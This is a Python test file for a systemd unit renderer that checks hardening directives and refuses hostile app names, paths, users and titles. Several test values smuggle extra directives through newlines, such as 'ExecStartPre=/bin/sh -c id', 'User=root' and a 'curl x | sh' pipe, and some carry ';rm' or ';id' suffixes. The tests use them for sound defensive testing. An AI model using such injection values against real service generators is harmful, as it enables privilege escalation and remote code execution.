"""systemd unit rendering: required hardening, and hostile values cannot add directives."""

from __future__ import annotations

import json
import os
import re

import pytest
from conftest import run_cli, run_cli_json

from easyui import units
from easyui.errors import UsageError

SAFE = {"app_path": "/srv/apps/fitness"}

SERVICE_REQUIRED = [
    "User=easyui-fitness",
    "Group=easyui-fitness",
    "NoNewPrivileges=yes",
    "ProtectSystem=strict",
    "ProtectHome=yes",
    "PrivateTmp=yes",
    "PrivateDevices=yes",
    "PrivateNetwork=yes",
    "RestrictAddressFamilies=AF_UNIX",
    "CapabilityBoundingSet=",
    "AmbientCapabilities=",
    "SystemCallFilter=@system-service",
    "MemoryMax=256M",
    "UMask=0077",
    "BindReadOnlyPaths=/var/lib/easy-ui/fitness/specs /var/lib/easy-ui/fitness/data",
    "BindPaths=/var/lib/easy-ui/fitness/auth",
    "TemporaryFileSystem=/var/lib/easy-ui:ro",
    "InaccessiblePaths=-/var/lib/mes",
    "ExecStart=/usr/local/bin/easy-ui serve --app-dir /srv/apps/fitness",
    "Requires=easy-ui-fitness.socket",
    'Environment="EASYUI_STATE_HOME=/var/lib/easy-ui" "MES_DATA_HOME=/var/lib/mes" "HOME=/nonexistent"',
]
SOCKET_REQUIRED = [
    "ListenStream=/run/easy-ui/fitness.sock",
    "SocketMode=0600",
    "SocketUser=root",
    "Accept=no",
    "WantedBy=sockets.target",
]

ALLOWED_KEYS = {
    "Description", "Requires", "After", "Type", "ExecStart", "User", "Group", "WorkingDirectory", "Environment",
    "UMask", "Restart", "RestartSec", "NoNewPrivileges", "CapabilityBoundingSet", "AmbientCapabilities",
    "RestrictSUIDSGID", "ProtectSystem", "ProtectHome", "PrivateTmp", "PrivateDevices", "DevicePolicy",
    "ProtectKernelTunables", "ProtectKernelModules", "ProtectKernelLogs", "ProtectControlGroups", "ProtectClock",
    "ProtectHostname", "ProtectProc", "ProcSubset", "KeyringMode", "RemoveIPC", "TemporaryFileSystem",
    "BindReadOnlyPaths", "BindPaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
    "IPAddressDeny", "SystemCallFilter", "SystemCallErrorNumber", "SystemCallArchitectures", "RestrictNamespaces",
    "RestrictRealtime", "LockPersonality", "MemoryDenyWriteExecute", "MemoryMax", "TasksMax", "LimitNOFILE",
    "LimitCORE", "ListenStream", "SocketUser", "SocketGroup", "SocketMode", "DirectoryMode", "RemoveOnStop",
    "Accept", "WantedBy",
}


def parse_unit(text: str) -> list[tuple[str, str, str]]:
    """(section, key, value) for every directive; asserts every line is a comment, section, blank or directive."""
    out, section = [], None
    for line in text.split("\n"):
        if not line or line.startswith("#"):
            continue
        m = re.match(r"^\[(\w+)\]$", line)
        if m:
            section = m.group(1)
            continue
        m = re.match(r"^([A-Za-z]+)=(.*)$", line)
        assert m, f"unexpected line: {line!r}"
        out.append((section, m.group(1), m.group(2)))
    return out


def test_render_defaults():
    u = units.render_units("fitness", title="My fitness", **SAFE)
    assert list(u) == ["easy-ui-fitness.socket", "easy-ui-fitness.service"]
    service, sock = u["easy-ui-fitness.service"], u["easy-ui-fitness.socket"]
    lines_service, lines_socket = service.split("\n"), sock.split("\n")
    for need in SERVICE_REQUIRED:
        assert need in lines_service, need
    for need in SOCKET_REQUIRED:
        assert need in lines_socket, need
    for text in u.values():
        for section, key, value in parse_unit(text):
            assert key in ALLOWED_KEYS, key
    assert "[Install]" not in service.split("\n")  # starts only through the socket, never at boot
    assert "[Install]" in sock.split("\n")
    assert "Description=easy-ui dashboards for My fitness (fitness)" in lines_service
    keys = [k for _s, k, _v in parse_unit(service)]
    assert keys.count("ExecStart") == 1 and "ExecStartPre" not in keys and "ExecStartPost" not in keys


def test_no_shell_in_execstart():
    service = units.render_units("fitness", **SAFE)["easy-ui-fitness.service"]
    exec_line = next(v for _s, k, v in parse_unit(service) if k == "ExecStart")
    assert not re.search(r"\b(sh|bash|zsh)\b|-c\b|[;&|`]", exec_line)
    assert exec_line.split()[0].startswith("/")


def test_options():
    u = units.render_units("fitness", user="eui-fit", exec_path="/opt/easy-ui/bin/easy-ui", app_path="/opt/apps/fitness",
                           state_home="/srv/state/easy-ui", data_home="/srv/data/mes", socket_path="/run/eui/fit.sock",
                           socket_owner="tailscale", memory_max="128M")
    service, sock = u["easy-ui-fitness.service"], u["easy-ui-fitness.socket"]
    assert "User=eui-fit" in service and "MemoryMax=128M" in service
    assert "ExecStart=/opt/easy-ui/bin/easy-ui serve --app-dir /opt/apps/fitness" in service
    assert "BindReadOnlyPaths=/srv/state/easy-ui/fitness/specs /srv/state/easy-ui/fitness/data" in service
    assert "ListenStream=/run/eui/fit.sock" in sock and "SocketUser=tailscale" in sock


HOSTILE_APPS = [
    "fitness\nExecStartPre=/bin/sh",
    "fit ness",
    "../etc",
    "Fitness",
    "",
    "a",
    "fit%n",
    "fit$USER",
    "x" * 32,
    "fit;rm",
    "fitness\r",
    None,
    7,
]


@pytest.mark.parametrize("app", HOSTILE_APPS)
def test_hostile_app_names_are_refused(app):
    with pytest.raises(UsageError):
        units.render_units(app, **SAFE)


HOSTILE_PATHS = [
    "/srv/apps/x\nExecStartPre=/bin/sh -c id",
    "/srv/apps/x\rUser=root",
    "/srv/apps/my app",
    "/srv/apps/$HOME",
    "/srv/apps/%h",
    "/srv/a:/etc",
    "/srv/../etc",
    "/srv/./x",
    "relative/path",
    "~/apps",
    "/srv/apps/",
    "//srv/apps",
    "/srv//apps",
    '/srv/"x"',
    "/srv/x;id",
    "/srv/x\\ny",
    "/srv/x\x00",
    "/",
    "",
    "/srv/caf\u00e9",
    None,
]


@pytest.mark.parametrize(
    "field,path",
    [(f, p) for f in ("app_path", "exec_path", "state_home", "data_home", "socket_path") for p in HOSTILE_PATHS
     if not (f == "socket_path" and not p)],  # an empty socket path means the default one
)
def test_hostile_paths_are_refused(field, path):
    kwargs = {**SAFE, field: path}
    with pytest.raises(UsageError):
        units.render_units("fitness", **kwargs)


@pytest.mark.parametrize("user", ["root\nUser=root", "Root", "1abc", "a b", "x" * 33, "a$b", "a%b", "", 5])
def test_hostile_users_are_refused(user):
    with pytest.raises(UsageError):
        units.render_units("fitness", user=user, **SAFE)
    with pytest.raises(UsageError):
        units.render_units("fitness", socket_owner=user, **SAFE)


@pytest.mark.parametrize("mem", ["256", "256MB", "-1M", "0M", "1T", "256M\nUser=root", "", 256])
def test_bad_memory(mem):
    with pytest.raises(UsageError):
        units.render_units("fitness", memory_max=mem, **SAFE)


@pytest.mark.parametrize("title", [
    "Evil\nExecStartPre=/bin/sh -c 'curl x | sh'",
    "Evil\r\n[Service]\nUser=root",
    "100% %h %n $HOME ${PATH} \\x41",
    "tab\tand\x00nul\x1b[31m",
    "\u2028line separator\u2029",
])
def test_hostile_title_stays_one_safe_line(title):
    u = units.render_units("fitness", title=title, **SAFE)
    for text in u.values():
        parsed = parse_unit(text)
        for _s, key, _v in parsed:
            assert key in ALLOWED_KEYS
        assert [k for _s, k, _v in parsed].count("User") <= 1
        desc = [v for _s, k, v in parsed if k == "Description"]
        assert len(desc) == 1
        d = desc[0]
        # every % and $ is doubled (no specifier or variable expansion), no control characters
        assert not re.search(r"(?<!%)%(?!%)", d.replace("%%", ""))
        assert "$" not in d.replace("$$", "")
        assert all(c.isprintable() for c in d)
    service = u["easy-ui-fitness.service"]
    keys = [k for _s, k, _v in parse_unit(service)]
    assert keys.count("User") == 1 and "ExecStartPre" not in keys
    assert [line for line in service.split("\n") if line.startswith("[")] == ["[Unit]", "[Service]"]


def test_escape_value_and_clean_text():
    assert units.escape_value("100%") == "100%%"
    assert units.escape_value("$HOME") == "$$HOME"
    assert units.escape_value("a\\b") == "a\\\\b"
    for bad in ("a\nb", "a\rb", "a\x00b"):
        with pytest.raises(UsageError):
            units.escape_value(bad)
    assert units.clean_text("a\nb\tc") == "a b c"
    assert len(units.clean_text("x" * 500)) == 80


def test_home_folders_are_refused():
    for field, value in (("app_path", "/home/someone/app"), ("state_home", "/root/state"),
                         ("exec_path", "/home/someone/.local/bin/easy-ui"), ("app_path", "/run/user/1000/app")):
        with pytest.raises(UsageError) as ei:
            units.render_units("fitness", **{**SAFE, field: value})
        assert "home folder" in ei.value.message


@pytest.mark.parametrize("kw", [
    {"app_path": "/var/lib/easy-ui/fitness"},
    {"state_home": "/srv/apps/fitness/state"},
    {"state_home": "/var/lib/mes/easy-ui"},
    {"data_home": "/var/lib/easy-ui/data"},
])
def test_overlapping_folders_are_refused(kw):
    with pytest.raises(UsageError):
        units.render_units("fitness", **{**SAFE, **kw})


def test_long_default_user_needs_option():
    app = "a" + "b" * 29
    with pytest.raises(UsageError) as ei:
        units.render_units(app, **SAFE)
    assert "--user" in ei.value.hint
    assert "User=eui-x" in units.render_units(app, user="eui-x", **SAFE)[f"easy-ui-{app}.service"]


def test_write_units(tmp_path):
    u = units.render_units("fitness", **SAFE)
    written = units.write_units(u, tmp_path / "out")
    assert sorted(os.path.basename(p) for p in written) == ["easy-ui-fitness.service", "easy-ui-fitness.socket"]
    assert (tmp_path / "out" / "easy-ui-fitness.service").read_text() == u["easy-ui-fitness.service"]


def test_write_units_does_not_follow_links(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    victim = tmp_path / "victim"
    victim.write_text("keep me")
    os.symlink(victim, out / "easy-ui-fitness.socket")
    with pytest.raises(UsageError):
        units.write_units(units.render_units("fitness", **SAFE), out)
    assert victim.read_text() == "keep me"
    os.symlink(out, tmp_path / "linkdir")
    with pytest.raises(UsageError):
        units.write_units(units.render_units("fitness", **SAFE), tmp_path / "linkdir")


# ---------------------------------------------------------------- command line


def test_cli_requires_render_only(demo_app):
    code, data = run_cli_json("units")
    assert code == 6 and data["error"]["code"] == "needs_human"


def test_cli_render_json(demo_app):
    code, data = run_cli_json("units", "--render-only", "--app-path", "/srv/apps/demo")
    assert code == 0 and data["app"] == "demo" and data["written"] == []
    assert "ExecStart=/usr/local/bin/easy-ui serve --app-dir /srv/apps/demo" in data["units"]["easy-ui-demo.service"]


def test_cli_render_text_and_out(demo_app, tmp_path):
    code, out, _ = run_cli("units", "--render-only", "--app-path", "/srv/apps/demo")
    assert code == 0 and "### easy-ui-demo.socket" in out and "### easy-ui-demo.service" in out
    code, out, _ = run_cli("units", "--render-only", "--app-path", "/srv/apps/demo", "--out", str(tmp_path / "u"),
                           "--user", "eui-demo", "--json")
    data = json.loads(out)
    assert code == 0 and len(data["written"]) == 2
    assert "User=eui-demo" in (tmp_path / "u" / "easy-ui-demo.service").read_text()


def test_cli_hostile_option(demo_app):
    code, data = run_cli_json("units", "--render-only", "--app-path", "/srv/x\nUser=root")
    assert code == 2 and data["error"]["code"] == "usage"


def test_cli_default_app_path_is_validated(demo_app):
    # the demo app lives in a temporary folder; its path is valid or refused with a plain message, never injected
    code, data = run_cli_json("units", "--render-only")
    if code == 0:
        assert f"--app-dir {demo_app.app_dir.resolve()}" in data["units"]["easy-ui-demo.service"]
    else:
        assert code == 2 and "service file" in data["error"]["message"]
